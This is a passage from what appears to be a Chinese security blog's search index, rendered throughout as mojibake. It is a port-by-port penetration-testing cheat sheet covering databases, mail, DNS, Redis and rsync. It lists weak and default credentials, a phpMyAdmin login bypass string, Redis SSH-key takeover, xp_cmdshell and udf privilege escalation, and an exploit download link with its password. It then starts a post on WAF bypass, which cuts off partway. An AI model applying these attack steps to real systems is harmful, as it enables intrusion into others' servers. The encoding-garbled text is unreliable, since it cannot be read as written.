·ã€‚ä½†æ˜¯è¿™ä¸æ˜¯æœ¬æ–‡éœ€è¦ä»‹ç»çš„é‡ç‚¹ï¼Œåé¢æœ‰æ—¶é—´ä¼šå†™ä¸€ç¯‡ä¸åŒæ•°æ®åº“çš„æ¸—é€æŠ€å·§ã€‚ MySQLæ•°æ®åº“é»˜è®¤ç«¯å£ï¼š3306 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ èº«ä»½è®¤è¯æ¼æ´ï¼šCVE-2012-2122 æ‹’ç»æœåŠ¡æ”»å‡»ï¼šåˆ©ç”¨sqlè¯­å¥æ˜¯æœåŠ¡å™¨è¿›è¡Œæ­»å¾ªç¯æ‰“æ­»æœåŠ¡å™¨ Phpmyadminä¸‡èƒ½å¯†ç ç»•è¿‡ï¼šç”¨æˆ·åï¼šâ€˜localhostâ€™@â€™@â€ å¯†ç ä»»æ„ æ¡ˆä¾‹åˆ†äº«ï¼š æ¼æ´åˆ†äº« å’Œè®¯ç½‘æŸç«™ç‚¹å­˜åœ¨mysqlæ³¨å…¥æ¼æ´ MySQLææƒæ€»ç»“ MSSQLæ•°æ®åº“é»˜è®¤ç«¯å£ï¼š1433ï¼ˆServer æ•°æ®åº“æœåŠ¡ï¼‰ã€1434ï¼ˆMonitor æ•°æ®åº“ç›‘æ§ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤/ä½¿ç”¨ç³»ç»Ÿç”¨æˆ· æ¡ˆä¾‹åˆ†äº«ï¼š MSSQLæ³¨å°„æ€»ç»“ ä¸Šæµ·å®‰è„‰ç»¼åˆç®¡ç†ç³»ç»Ÿmssqlæ³¨å°„æ¼æ´ è§£å¯†MSSQLè¿æ¥æ•°æ®åº“å¯†ç  ä»æ”»å‡»MSSQLåˆ°ææƒ: ä½¿ç”¨msfé’ˆå¯¹mssqlçš„ä¸€æ¬¡å®Œæ•´æ¸—é€ Oracleæ•°æ®åº“é»˜è®¤ç«¯å£ï¼š1521ï¼ˆæ•°æ®åº“ç«¯å£ï¼‰ã€1158ï¼ˆOracle EMCTLç«¯å£ï¼‰ã€8080ï¼ˆOracle XDBæ•°æ®åº“ï¼‰ã€210ï¼ˆOracle XDB FTPæœåŠ¡ï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ æ³¨å…¥æ”»å‡»ï¼› æ¼æ´æ”»å‡»ï¼› æ¡ˆä¾‹åˆ†äº«ï¼š Oracleç›²æ³¨ç»“åˆXXEæ¼æ´è¿œç¨‹è·å–æ•°æ® PostgreSQLæ•°æ®åº“PostgreSQLæ˜¯ä¸€ç§ç‰¹æ€§éå¸¸é½å…¨çš„è‡ªç”±è½¯ä»¶çš„å¯¹è±¡â€“å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œå¯ä»¥è¯´æ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›ï¼ŒåŠŸèƒ½æœ€å¼ºå¤§çš„è‡ªç”±æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚åŒ…æ‹¬æˆ‘ä»¬kaliç³»ç»Ÿä¸­msfä¹Ÿä½¿ç”¨è¿™ä¸ªæ•°æ®åº“ï¼›æµ…è°ˆpostgresqlæ•°æ®åº“æ”»å‡»æŠ€æœ¯ å¤§éƒ¨åˆ†å…³äºå®ƒçš„æ”»å‡»ä¾æ—§æ˜¯sqlæ³¨å…¥ï¼Œæ‰€ä»¥æ³¨å…¥æ‰æ˜¯æ•°æ®åº“ä¸å˜çš„è¯é¢˜ã€‚ é»˜è®¤ç«¯å£ï¼š5432 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ï¼špostgres postgres ç¼“å†²åŒºæº¢å‡ºï¼šCVE-2014-2669 æ¡ˆä¾‹åˆ†äº«ï¼š Hacking postgresql å…³äºpostgresqlçš„é‚£äº›äº‹ MongoDBæ•°æ®åº“MongoDBï¼šNoSQLæ•°æ®åº“ï¼›æ”»å‡»æ–¹æ³•ä¸å…¶ä»–æ•°æ®åº“ç±»ä¼¼ï¼›å…³äºå®ƒçš„å®‰å…¨è®²è§£ï¼šè¯·å‚è€ƒ é»˜è®¤ç«¯å£ï¼š27017 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ æœªæˆæƒè®¿é—®ï¼›githubæœ‰æ”»å‡»ä»£ç ï¼›è¯·ç‚¹å‡» æ¡ˆä¾‹åˆ†äº«ï¼š MongoDB phpMoAdminè¿œç¨‹ä»£ç æ‰§è¡Œ æœç‹MongoDBæœªæˆæƒè®¿é—® æ–°æµªå¾®ç±³æœªæˆæƒè®¿é—® è§£å†³MongoDBå„ç§éšæ‚£é—®é¢˜ Redisæ•°æ®åº“redisï¼šæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨cè¯­è¨€å†™çš„ï¼Œæ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€key-valueæ•°æ®åº“ã€‚å…³äºè¿™ä¸ªæ•°æ®åº“è¿™ä¸¤å¹´è¿˜æ˜¯å¾ˆç«çš„ï¼Œæš´éœ²å‡ºæ¥çš„é—®é¢˜ä¹Ÿå¾ˆå¤šã€‚ç‰¹åˆ«æ˜¯å‰æ®µæ—¶é—´æš´éœ²çš„æœªæˆæƒè®¿é—®ã€‚Expï¼šhttps://yunpan.cn/cYjzHxawFpyVt è®¿é—®å¯†ç  e547 é»˜è®¤ç«¯å£ï¼š6379 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ æœªæˆæƒè®¿é—®+é…åˆssh keyææƒï¼› æ¡ˆä¾‹åˆ†äº«ï¼š ä¸­å›½é“å»ºç½‘redis+ssh-keygenå…è®¤è¯ç™»å½• SysBaseæ•°æ®åº“é»˜è®¤ç«¯å£ï¼šæœåŠ¡ç«¯å£5000ï¼›ç›‘å¬ç«¯å£4100ï¼›å¤‡ä»½ç«¯å£ï¼š4200 æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ å‘½ä»¤æ³¨å…¥ï¼š æ¡ˆä¾‹åˆ†äº«ï¼š å¹¿è¥¿è‡ªè€ƒä¿¡æ¯ç³»ç»ŸSybaseæ•°æ®åº“æ³¨å…¥ Sybase EAServerå‘½ä»¤æ³¨å…¥æ¼æ´ DB2æ•°æ®åº“é»˜è®¤ç«¯å£ï¼š5000 æ”»å‡»æ–¹å¼ï¼š å®‰å…¨é™åˆ¶ç»•è¿‡ï¼šæˆåŠŸåå¯æ‰§è¡Œæœªæˆæƒæ“ä½œï¼ˆCVE-2015-1922ï¼‰ æ¡ˆä¾‹åˆ†äº«ï¼š å“ˆå°”æ»¨é“¶è¡Œä¸»ç«™DB2æ³¨å…¥ æ€»ç»“ä¸€ä¸‹ï¼šå¯¹äºæ•°æ®åº“ï¼Œæˆ‘ä»¬å¾—çŸ¥ç«¯å£å¾ˆå¤šæ—¶å€™å¯ä»¥å¸®åŠ©æˆ‘ä»¬å»æ¸—é€ï¼Œæ¯”å¦‚å¾—çŸ¥mysqlçš„ æ•°æ®åº“ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨SQLæ³¨å…¥è¿›è¡Œmofã€udfç­‰æ–¹å¼ææƒï¼›å¦‚æœæ˜¯mssqlæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨xp_cmdshellæ¥è¿›è¡Œææƒï¼›å¦‚æœæ˜¯å…¶å®ƒçš„æ•°æ® åº“ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨å¯¹åº”çš„æ–¹å¼ï¼›æ¯”å¦‚å„å¤§æ•°æ®åº“å¯¹åº”å®ƒä»¬çš„é»˜è®¤å£ä»¤ï¼Œç‰ˆæœ¬å¯¹åº”çš„æ¼æ´ï¼ é¡ºä¾¿æä¸€ä¸‹ï¼šå¾ˆå¤šæ—¶å€™é“¶è¡Œä¼ä¸šé‡‡ç”¨çš„éƒ½æ˜¯oracleã€db2ç­‰å¤§å‹æ•°æ®åº“ï¼› é‚®ä»¶æœåŠ¡ç«¯å£æ¸—é€SMTPåè®®smtpï¼šé‚®ä»¶åè®®ï¼Œåœ¨linuxä¸­é»˜è®¤å¼€å¯è¿™ä¸ªæœåŠ¡ï¼Œå¯ä»¥å‘å¯¹æ–¹å‘é€é’“é±¼é‚®ä»¶ï¼ é»˜è®¤ç«¯å£ï¼š25ï¼ˆsmtpï¼‰ã€465ï¼ˆsmtpsï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ æœªæˆæƒè®¿é—® æ¡ˆä¾‹åˆ†äº«ï¼š è…¾è®¯é‚®ç®±smtpæ³¨å†Œæ—¶é—´é™åˆ¶ç»•è¿‡æ¼æ´ é‚®ä»¶ä¼ªé€ è¯¦è§£ qqé‚®ç®±ä¼ªé€ å‘ä»¶åœ°å€ï¼Œå®¹æ˜“è¢«é’“é±¼åˆ©ç”¨ ä¼—å¤šå‚å•†é‚®ä»¶ç³»ç»Ÿé…ç½®ä¸å½“å¯ä¼ªé€ é‚®ä»¶äºº POP3åè®®é»˜è®¤ç«¯å£ï¼š109ï¼ˆPOP2ï¼‰ã€110ï¼ˆPOP3ï¼‰ã€995ï¼ˆPOP3Sï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼›å¼±å£ä»¤ æœªæˆæƒè®¿é—®ï¼› æ¡ˆä¾‹åˆ†äº«ï¼š ä¸­å›½è”é€šæ²ƒé‚®ç®±ç­‰éƒ¨åˆ†Androidå®¢æˆ·ç«¯å…å¯†ç ç™»é™†ï¼ˆå¯è·å–ä»»æ„è”é€šç”¨æˆ·pop3å¯†ç ï¼‰ ä¸­èˆªä¿¡é‚®ç®±å¯†ç æ³„æ¼åŠVPNè´¦å·å’Œå¤§é‡é‚®ç®±å¼±å£ä»¤å¯¼è‡´å¯å†…ç½‘æ¼«æ¸¸æ‹¿åˆ°åŸŸæ§ IMAPåè®®é»˜è®¤ç«¯å£ï¼š143ï¼ˆimapï¼‰ã€993ï¼ˆimapsï¼‰ æ”»å‡»æ–¹å¼ï¼š çˆ†ç ´ï¼šå¼±å£ä»¤ é…ç½®ä¸å½“ æ¡ˆä¾‹åˆ†äº«ï¼š 163é‚®ç®±äºŒæ¬¡éªŒè¯é¥¶è¿‡ç¼ºé™· å—æ–¹å‘¨æœ«é‚®ä»¶æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ ç½‘ç»œå¸¸è§åè®®ç«¯å£æ¸—é€DNSæœåŠ¡é»˜è®¤ç«¯å£ï¼š53 æ”»å‡»æ–¹å¼ï¼š åŒºåŸŸä¼ è¾“æ¼æ´ è§2ä¸­çš„æ€»ç»“ æ¡ˆä¾‹åˆ†äº«ï¼š å…¨çƒTop1000Websitesä¸­å­˜åœ¨DNSåŒºåŸŸä¼ é€æ¼æ´çš„ç½‘ç«™åˆ—è¡¨ å›¢è´­ç‹æŸç«™DNSåŸŸä¼ é€æ¼æ´ DNSæ³›è§£æä¸å†…å®¹æŠ•æ¯’ DHCPæœåŠ¡é»˜è®¤ç«¯å£ï¼š67&amp;68ã€546ï¼ˆDHCP FailoveråšåŒæœºçƒ­å¤‡çš„ï¼‰ æ”»å‡»æ–¹å¼ï¼š DHCPåŠ«æŒï¼› è§2ä¸­æ€»ç»“ æ¡ˆä¾‹åˆ†äº«ï¼š æµæ°“DHCPæœåŠ¡å™¨å†…ç½‘æ”»å‡»æµ‹è¯• SNMPåè®®é»˜è®¤ç«¯å£ï¼š161 æ”»å‡»æ–¹å¼: çˆ†ç ´ï¼šå¼±å£ä»¤ æ¡ˆä¾‹åˆ†äº«ï¼š snmpå¼±å£ä»¤å¼•èµ·çš„ä¿¡æ¯æ³„æ¼ åŸºäºsnmpçš„åå°„æ”»å‡»çš„ç†è®ºåŠå…¶å®ç° åä¸ºæŸæœåŠ¡å™¨SNMPå¼±å£ä»¤ å…¶ä»–ç«¯å£æ¸—é€Hadoopæ–‡ä»¶æœåŠ¡é»˜è®¤ç«¯å£ï¼šè¯·å‚è€ƒ æ¡ˆä¾‹åˆ†äº«ï¼š Apache Hadoopè¿œç¨‹å‘½ä»¤æ‰§è¡Œ æ–°æµªæ¼æ´ç³»åˆ—ç¬¬å…­å¼¹â€“å¤§é‡hadoopåº”ç”¨å¯¹å¤–è®¿é—® ZookeeperæœåŠ¡zookeeperï¼šåˆ†å¸ƒå¼çš„ï¼Œå¼€æ”¾æºç çš„åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºåè°ƒæœåŠ¡ï¼›æä¾›åŠŸèƒ½åŒ…æ‹¬ï¼šé…ç½®ç»´æŠ¤ã€åŸŸåæœåŠ¡ã€åˆ†å¸ƒå¼åŒæ­¥ã€ç»„æœåŠ¡ç­‰ã€‚è¯¦æƒ…è¯·å‚è€ƒç™¾åº¦ç™¾ç§‘ é»˜è®¤ç«¯å£ï¼š2181 æ”»å‡»æ–¹å¼ï¼š æœªæˆæƒè®¿é—®ï¼› æ¡ˆä¾‹åˆ†äº«ï¼š zookeeperæœªæˆæƒè®¿é—®æ¼æ´ ç½‘ä¸Šå…³äºè¿™æ–¹é¢çš„æ¡ˆä¾‹æš‚æ—¶ä¸å¤šï¼Œä½†æ˜¯å¯¹äºå¤§æ•°æ®é€æ¸æ³›æ»¥çš„ä»Šå¤©ï¼Œè¿™äº›æ¼æ´æœªæ¥ä¼šåœ¨ä¹Œäº‘ä¸Šå‡ºç°ä¸€å¤§æ³¢ï¼ ZabbixæœåŠ¡zabbixï¼šåŸºäºWebç•Œé¢çš„æä¾›åˆ†å¸ƒå¼ç³»ç»Ÿç›‘è§†ä»¥åŠç½‘ç»œç›‘è§†åŠŸèƒ½çš„ä¼ä¸šçº§çš„å¼€æºè§£å†³æ–¹æ¡ˆã€‚ç›‘è§†å„ç§ç½‘ç»œå‚æ•°ï¼Œä¿è¯æœåŠ¡å™¨ç³»ç»Ÿçš„å®‰å…¨è¿è¥ã€‚ é»˜è®¤ç«¯å£ï¼š8069 æ”»å‡»æ–¹å¼ï¼š è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼š æ¡ˆä¾‹åˆ†äº«ï¼š å½“æ¸—é€é‡åˆ°zabbixâ€“å°è°ˆzabbixå®‰å…¨ Zabbixçš„å‰å°SQLæ³¨å°„æ¼æ´åˆ©ç”¨ ç½‘æ˜“zabbixè¿ç»´ä¸å½“ï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚(å¯ææƒã€å¯å†…ç½‘æ¸—é€) elasticsearchæœåŠ¡elasticsearchï¼šè¯·ç™¾åº¦ï¼ˆå› ä¸ºæˆ‘è§‰å¾—æˆ‘è§£é‡Šä¸æ¸…æ¥šï¼‰ é»˜è®¤ç«¯å£ï¼š9200ï¼ˆï¼‰ã€9300ï¼ˆï¼‰ æ”»å‡»æ–¹å¼ï¼š æœªæˆæƒè®¿é—®ï¼› è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼› æ–‡ä»¶éå†ï¼› ä½ç‰ˆæœ¬webshellæ¤å…¥ï¼› æ¡ˆä¾‹åˆ†äº«ï¼š ElasticSearch è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ elasticsearch æ¼æ´åˆ©ç”¨å·¥å…· memcacheæœåŠ¡é»˜è®¤ç«¯å£ï¼š11211 æ¡ˆä¾‹åˆ†äº«ï¼š Memcacheå®‰å…¨é…ç½® memcache æœªæˆæƒè®¿é—®æ¼æ´ Linux RæœåŠ¡RæœåŠ¡ï¼šTCPç«¯å£512,513å’Œ514ä¸ºè‘—åçš„rloginæä¾›æœåŠ¡ã€‚åœ¨ç³»ç»Ÿä¸­è¢«é”™è¯¯é…ç½®ä»è€Œå…è®¸è¿œç¨‹è®¿é—®è€…ä»ä»»ä½•åœ°æ–¹è®¿é—®ï¼ˆæ ‡å‡†çš„ï¼Œrhosts + +ï¼‰ã€‚ é»˜è®¤ç«¯å£ï¼š512ï¼ˆremote process executionï¼‰ï¼›513ï¼ˆremote login a latelnetï¼‰ï¼›514ï¼ˆcmdï¼‰ æ”»å‡»æ–¹å¼ï¼š ä½¿ç”¨rloginç›´æ¥ç™»å½•å¯¹æ–¹ç³»ç»Ÿï¼› RMIRMIï¼šæˆ‘ä»¬ä½¿ç”¨è¿™ä¸¤ä¸ªç«¯å£å¾ˆå°‘çš„åŸå› æ˜¯å› ä¸ºå¿…é¡»æ˜¯javaï¼Œè€Œä¸”rmiç©¿è¶Šé˜²ç«å¢™å¹¶ä¸å¥½ç©¿è¶Šï¼›è¿™é‡Œæˆ‘ä¸ä¼šå»æ¶‰åŠå…¶ä»–çš„ä¸œè¥¿ï¼Œè¿™é‡Œæå‡ºRMIåªæ˜¯å› ä¸ºåœ¨å‰æ®µæ—¶é—´çš„javaååºåˆ—åŒ–ä¸­ï¼Œæˆ‘ä»¬çš„å°ä¼™ä¼´Birdå†™è¿‡ä¸€ä¸ªweblogicåˆ©ç”¨å·¥å…·ï¼Œé‡Œé¢æ¶‰åŠåˆ°äº†RMIçš„ä¸€äº›ä¸œè¥¿ï¼Œåœ¨æœ‰çš„æ—¶å€™ä½¿ç”¨socketä¸èƒ½æˆåŠŸæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨RMIæ–¹å¼æ¥è¿›è¡Œåˆ©ç”¨ï¼› é»˜è®¤ç«¯å£ï¼š1090ï¼ˆï¼‰ã€1099ï¼ˆï¼‰ æ”»å‡»æ–¹å¼ï¼š è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆjavaååºåˆ—åŒ–ï¼Œè°ƒç”¨rmiæ–¹å¼æ‰§è¡Œå‘½ä»¤ï¼‰ è¿™å°±æ˜¯RMIçš„é­…åŠ›äº†ï¼ å·¥å…·ä¸‹è½½ï¼šè¯·ç‚¹æˆ‘ RsyncæœåŠ¡Rsyncï¼šç±»UNIXç³»ç»Ÿä¸‹çš„æ•°æ®å¤‡ä»½å·¥å…·ï¼ˆremote syncï¼‰ï¼Œå±äºå¢é‡å¤‡ä»½ï¼›å…³äºå®ƒçš„åŠŸèƒ½ï¼Œå¤§å®¶è‡ªè¡Œç™¾åº¦ç™¾ç§‘å§ï¼Œå…¶å®ä¸Šé¢å¾ˆå¤šå¤§å®¶ä¹Ÿçœ‹åˆ°äº†è¯´æ˜¯ç«¯å£æ¸—é€ï¼Œå…¶å®å°±æ˜¯ç«¯å£å¯¹åº”æœåŠ¡çš„æ¸—é€ï¼ŒæœåŠ¡ä¸€èˆ¬å‡ºé”™å°±åœ¨é…ç½®æˆ–è€…ç‰ˆæœ¬é—®é¢˜ä¸Šï¼Œrsyncä¹Ÿä¸ä¾‹å¤–ã€‚Rsyncé»˜è®¤å…è®¸åŒ¿åè®¿é—®ï¼Œå¦‚æœåœ¨é…ç½®æ–‡ä»¶ä¸­æ²¡æœ‰ç›¸å…³çš„ç”¨æˆ·è®¤è¯ä»¥åŠæ–‡ä»¶æˆæƒï¼Œå°±ä¼šè§¦å‘éšæ‚£ã€‚ é»˜è®¤ç«¯å£ï¼š873 æ”»å‡»æ–¹å¼ï¼š æœªæˆæƒè®¿é—®ï¼› æœ¬åœ°ææƒï¼šrsyncé»˜è®¤ä»¥rootè¿è¡Œï¼Œåˆ©ç”¨rsyncä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œåªè¦è¿™ä¸ªæ–‡ä»¶å…·æœ‰sæƒé™ï¼Œæˆ‘ä»¬æ‰§è¡Œæˆ‘ä»¬çš„æ”»å‡»è„šæœ¬å°±å¯ä»¥å…·æœ‰rootæƒé™ã€‚è¯¦ç»†è¯·å‚è€ƒå’Œå‚è€ƒäºŒ æ¡ˆä¾‹åˆ†äº«ï¼š æœç‹å‡ å¤„rsyncæœªæˆæƒè®¿é—® Socketä»£ç†é»˜è®¤ç«¯å£ï¼š1080 Socketä»£ç†é’ˆå¯¹ä»£ç†æ¥è¯´æ²¡æœ‰ä»€ä¹ˆæ¼æ´ï¼Œä¸€èˆ¬åªæ˜¯åœ¨æ¸—é€è¿‡ç¨‹ä¸­ä½œä¸ºæˆ‘ä»¬çš„ä»£ç†ï¼Œè¿›å…¥å†…ç½‘ï¼Œæˆ–è€…æ¸—é€åŸŸå’Œæ—çš„æ—¶å€™æœ‰å¸®åŠ©ã€‚è¿™é‡Œä¸åšè¿‡å¤šæè¿°ï¼Œä½†æ˜¯å¯ä»¥å°è¯•çˆ†ç ´ä¸€ä¸‹ä»£ç†çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä¸‡ä¸€è¿æ°”å¥½èƒ½ç™»å½•ï¼Œä¸ä¹Ÿ~ æ¡ˆä¾‹åˆ†äº«ï¼š åˆ©ç”¨php socket5ä»£ç†æ¸—é€å†…ç½‘","categories":[],"tags":[],"keywords":[]},{"title":"wafç»•è¿‡","slug":"wafç»•è¿‡","date":"2020-05-09T13:34:12.000Z","updated":"2020-09-20T09:04:26.983Z","comments":true,"path":"2020/05/09/wafç»•è¿‡/","link":"","permalink":"https://zhangyanlady.github.io/2020/05/09/waf%E7%BB%95%E8%BF%87/","excerpt":"","text":"æ€»ç»“å›¾ å®‰è£…ä»‹ç»https://www.jstxk.com/article/12.html ç»è¿‡ä¸€ç•ªæœç´¢ï¼Œç»ˆäºæ‰¾åˆ°äº†è§£å†³æ–¹æ³•ï¼Œä½œä¸‹è®°å½•ï¼šè¿™é‡Œå…ˆæŠŠApacheå…³æ‰ï¼Œç„¶åæ‰“å¼€å‘½ä»¤è¡Œå·¥å…·ï¼Œåˆ‡æ¢åˆ°apacheå®‰è£…ç›®å½•ä¸‹çš„binæ–‡ä»¶å¤¹ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ httpd.exe -k install -n apache2.0 å¦‚æœè¦åˆ é™¤æœåŠ¡é‡æ–°æ¥ï¼Œå¯ä»¥è¾“ä¸‹é¢è¿™ä¸ªï¼Œç»™ä½ ç•™ç€å¤‡ç”¨ sc delete apache2.0 ç„¶åå°±ä¼šå‡ºç°å®‰è£…æˆåŠŸçš„æç¤ºï¼Œå†è¿›è¡Œå®‰å…¨ç‹—çš„é…ç½® ğŸƒWAFç®€ä»‹ 1ã€ç½‘ç«™WAFæ˜¯ä¸€æ¬¾é›†ç½‘ç«™å†…å®¹å®‰å…¨é˜²æŠ¤ã€ç½‘ç«™èµ„æºä¿æŠ¤åŠç½‘ç«™æµé‡ä¿æŠ¤åŠŸèƒ½ä¸ºä¸€ä½“çš„æœåŠ¡å™¨å·¥å…·ã€‚åŠŸèƒ½æ¶µç›–äº†ç½‘é©¬/æœ¨é©¬æ‰«æã€é˜²SQLæ³¨å…¥ã€é˜²ç›—é“¾ã€é˜²CCæ”»å‡»ã€ç½‘ç«™æµé‡å®æ—¶ç›‘æ§ã€ç½‘ç«™CPUç›‘æ§ã€ä¸‹è½½çº¿ç¨‹ä¿æŠ¤ã€IPé»‘ç™½åå•ç®¡ç†ã€ç½‘é¡µé˜²ç¯¡æ”¹åŠŸèƒ½ç­‰æ¨¡å—ã€‚èƒ½å¤Ÿä¸ºç”¨æˆ·æä¾›å®æ—¶çš„ç½‘ç«™å®‰å…¨é˜²æŠ¤ï¼Œé¿å…å„ç±»é’ˆå¯¹ç½‘ç«™çš„æ”»å‡»æ‰€å¸¦æ¥çš„å±å®³ã€‚ 2ã€ç½‘ç«™WAFæ˜¯ä¸€æ¬¾æœåŠ¡å™¨å®‰å…¨é˜²æŠ¤è½¯ä»¶ï¼Œæ˜¯ä¸ºIDCè¿è¥å•†ã€è™šæ‹Ÿä¸»æœºæœåŠ¡å•†ã€ä¼ä¸šä¸»æœºã€æœåŠ¡å™¨ç®¡ç†è€…ç­‰ç”¨æˆ·æä¾›æœåŠ¡å™¨å®‰å…¨é˜²èŒƒçš„å®ç”¨ç³»ç»Ÿï¼Œæ˜¯é›†ç½‘ç«™å†…å®¹å®‰å…¨é˜²æŠ¤ã€ç½‘ç«™èµ„æºä¿æŠ¤åŠç½‘ç«™æµé‡ä¿æŠ¤åŠŸèƒ½ä¸ºä¸€ä½“çš„æœåŠ¡å™¨å·¥å…·ã€‚ 3ã€å¸¸è§çš„ç³»ç»Ÿæ”»å‡»åˆ†ä¸ºä¸¤ç±»ï¼šä¸€æ˜¯åˆ©ç”¨WebæœåŠ¡å™¨çš„æ¼æ´è¿›è¡Œæ”»å‡»ï¼Œå¦‚DDOSæ”»å‡»ã€ç—…æ¯’æœ¨é©¬ç ´åç­‰æ”»å‡»ï¼›äºŒæ˜¯åˆ©ç”¨ç½‘é¡µè‡ªèº«çš„å®‰å…¨æ¼æ´è¿›è¡Œæ”»å‡»ï¼Œå¦‚SQLæ³¨å…¥æ”»å‡»ã€è·¨ç«™è„šæœ¬æ”»å‡»ç­‰ã€‚å¸¸è§æ”»å‡»æ–¹å¼å¯¹ç½‘ç«™æœåŠ¡å™¨å¸¦æ¥çš„å±å®³ä¸»è¦é›†ä¸­åœ¨ç—…æ¯’æœ¨é©¬ç ´åã€ç½‘é¡µéæ³•ç¯¡æ”¹ã€å„ç±»ç½‘ç»œæ”»å‡»å¸¦æ¥çš„å¨èƒã€‚ ğŸWAFä¸»è¦åŠŸèƒ½ç½‘é©¬æœ¨é©¬ä¸»åŠ¨é˜²å¾¡åŠæŸ¥æ€ ç½‘é¡µæœ¨é©¬å’Œç½‘é¡µæŒ‚é©¬æ‰«æå·¥å…·é‡‡ç”¨ç‰¹å¾ç +å¯å‘å¼å¼•æ“çš„æŸ¥æ€ç®—æ³•ï¼ŒWEBæœ¨é©¬æ£€å‡ºç‡å¤§äº90% æµé‡ç›‘æ§ èƒ½å¤Ÿå®æ—¶ç›‘æµ‹åˆ°æ¯ä¸ªç½‘ç«™çš„è¿›å‡ºæµé‡å’Œæ€»æµé‡ï¼Œä»¥åŠæ¯ä¸ªåº”ç”¨ç¨‹åºæ± åŠç½‘ç«™çš„CPUå ç”¨æƒ…å†µ ç½‘ç«™æ¼æ´é˜²å¾¡åŠŸèƒ½ å¯æ‹¦æˆªGETã€POSTã€COOKIESç­‰æ–¹å¼çš„SQLæ³¨å…¥ï¼Œå¯å¯¹GETã€POSTã€COOKIESåˆ†åˆ«å®šä¹‰ç‰¹å¾ç ï¼Œä»¥åŠå¯æ‹¦æˆªXSSæ³¨å…¥ç­‰è¡Œä¸ºã€‚ å±é™©ç»„ä»¶é˜²æŠ¤åŠŸèƒ½ å…¨é¢æ‹¦æˆªæ¶æ„ä»£ç å¯¹ç»„ä»¶çš„è°ƒç”¨æƒé™ï¼Œæ‹¦æˆªIISæ‰§è¡Œæ¶æ„ç¨‹åºï¼Œä¿æŠ¤ç½‘ç«™å®‰å…¨ .Net**å®‰å…¨ä¿æŠ¤æ¨¡å—** å¿«æ·è®¾ç½®.Netå®‰å…¨æ¨¡å¼ï¼Œç¦æ­¢.Netæ‰§è¡Œç³»ç»Ÿæ•æ„Ÿå‡½æ•°ï¼Œä¿éšœç½‘ç«™å®‰å…¨ åŒå±‚é˜²ç›—é“¾é“¾æ¥æ¨¡å¼ å¯ä»¥é’ˆå¯¹ä¸åŒç«™ç‚¹è®¾ç½®é˜²ç›—é“¾çš„è¿‡æ»¤, é˜²æ­¢å›¾ç‰‡ã€æ¡Œé¢ã€è½¯ä»¶ã€éŸ³ä¹ã€ç”µå½±è¢«äººå¼•ç”¨ã€‚å¦‚æœå‘ç°è¯·æ±‚è€…æ˜¯ç›—ç”¨ç½‘ç«™é“¾æ¥, åˆ™è‡ªåŠ¨é‡å®šå‘åˆ°é”™è¯¯å¤„ç†é¡µé¢ ç½‘ç«™ç‰¹å®šèµ„æºé˜²ä¸‹è½½ æ”¯æŒå¯¹docã€mdbã€mdfã€mydç­‰ç‰¹å®šèµ„æºçš„é˜²ä¸‹è½½ä¿æŠ¤ï¼ŒåŠ å…¥è¦ä¿æŠ¤çš„æ•æ„Ÿèµ„æ–™çš„è·¯å¾„ï¼Œå³å¯é˜²æ­¢æ•æ„Ÿèµ„æ–™è¢«ä¸‹è½½ CC**æ”»å‡»é˜²æŠ¤** â€‹ è‡ªä¸»ç ”å‘çš„ç‹¬ç‰¹æŠ—æ”»å‡»ç®—æ³•ï¼Œé«˜æ•ˆçš„ä¸»åŠ¨é˜²å¾¡ç³»ç»Ÿå¯æœ‰æ•ˆé˜²å¾¡CCæ”»å‡»ã€æµé‡æ”»å‡»ã€‚ ç½‘ç«™æµé‡ä¿æŠ¤ æ”¯æŒä¸‹è½½æµé‡æ§åˆ¶ã€ä¸‹è½½çº¿ç¨‹æ§åˆ¶ã€‚é‡‡ç”¨ç‹¬åˆ›çš„çº¿ç¨‹æ§åˆ¶å’Œæµé‡æ§åˆ¶æŠ€æœ¯,å¤§å¤§æé«˜æœåŠ¡å™¨æ€§èƒ½, ä¿æŠ¤ç½‘ç«™æµé‡ã€‚ IP**é»‘ç™½åå•** å…¨IPé»‘ç™½åå•åŠŸèƒ½å…è®¸ç”¨æˆ·è®¾ç½®ä¸ªæ€§åŒ–çš„IPä¿¡ä»»åˆ—è¡¨ï¼Œç›´æ¥å±è”½æˆ–è€…å…è®¸æŒ‡å®šIPè®¿é—®ç½‘ç«™ã€‚åŒæ—¶ï¼Œå¢åŠ 